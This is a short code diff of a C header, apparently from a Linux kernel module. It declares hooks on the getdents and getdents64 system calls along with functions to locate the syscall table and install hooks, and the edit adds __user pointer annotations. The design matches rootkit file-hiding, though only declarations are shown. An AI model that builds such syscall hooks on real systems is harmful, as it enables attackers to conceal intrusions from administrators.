@@ -12,8 +12,8 @@ typedef struct {
     void *orig;
 } hook_t;
 
-extern asmlinkage long (*sys_getdents)(unsigned, struct linux_dirent *, unsigned);
-extern asmlinkage long (*sys_getdents64)(unsigned, struct linux_dirent64 *, unsigned);
+extern asmlinkage long (*sys_getdents)(unsigned, struct linux_dirent __user *, unsigned);
+extern asmlinkage long (*sys_getdents64)(unsigned, struct linux_dirent64 __user *, unsigned);
 
 int retrieve_sys_call_table(void);
 void init_hooks(void);
